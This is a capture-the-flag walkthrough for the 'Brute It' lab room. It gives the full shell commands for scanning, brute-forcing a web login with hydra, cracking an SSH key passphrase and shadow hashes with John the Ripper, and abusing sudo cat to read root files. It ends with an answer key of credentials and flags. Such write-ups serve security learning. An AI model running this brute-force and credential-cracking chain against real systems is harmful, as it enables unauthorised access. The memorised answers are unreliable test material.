# Brute It - Easy

```shell
nmap -T4 -A 10.10.13.74

gobuster dir -u http://10.10.13.74 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.13.74 http-post-form "/admin/index.php:user=admin&pass=^PASS^:F=Username or password invalid"
#gives us the creds

ssh2john id_rsa > hash_id_rsa
#crack hash using john

john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa

#after getting passphrase
chmod 600 id_rsa

ssh john@10.10.13.74 -i id_rsa
#use passphrase

sudo -l
#shows that we can run cat
#follow exploit on GTFObins

LFILE=/root/root.txt

sudo cat "$LFILE"
#prints root flag
#print /etc/shadow and /etc/passwd in the same manner

#in attacker machine
vim passwd
#copy /etc/passwd contents in this file

vim shadow
#copy /etc/shadow contents in this file

unshadow passwd shadow > unshadowed.txt

#crack unshadowed file
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
#this gives password for root
```

```markdown
We run the nmap scan as required, with all apt flags.

nmap shows the following ports & services (along with the versions):

  * 22 - ssh
  * 80 - http

While the nmap scan runs, we can also scan the webserver for hidden directories.

gobuster gives us a hidden directory /admin, which leads us to a login page.

We can use hydra to bypass login page; we have to use the username 'admin'.

Hydra successfully cracks the login page and we get the creds admin:xavier.

Logging in using the creds gives us the web flag and a RSA private key.

We can use ssh2john and John the Ripper to crack the private key and get passphrase for SSH login.

This gives us the passphrase 'rockinroll'; we can use this for logging into SSH as John, along with the id_rsa file.

We get the user flag in /home/john.

For privesc, we first check what commands we can run as sudo.

We can run the cat binary as sudo, so we can check on GTFObins for exploit.

Following the exploit, we can read the root flag.

Since we can read any file using this exploit, we can read /etc/passwd and /etc/shadow and combine both of them to be cracked by unshadow to get root password.
```

1. How many ports are open? - 2

2. What version of SSH is running? - openssh 7.6p1

3. What version of Apache is running? - 2.4.29

4. Which Linux distribution is running? - Ubuntu

5. What is the hidden directory? - /admin

6. What is the user:password of the admin panel? - admin:xavier

7. What is John's RSA Private Key passphrase? - rockinroll

8. user.txt - THM{a_password_is_not_a_barrier}

9. web flag - THM{brut3_f0rce_is_e4sy}

10. What is the root's password? - football

11. root.txt - THM{pr1v1l3g3_3sc4l4t10n}
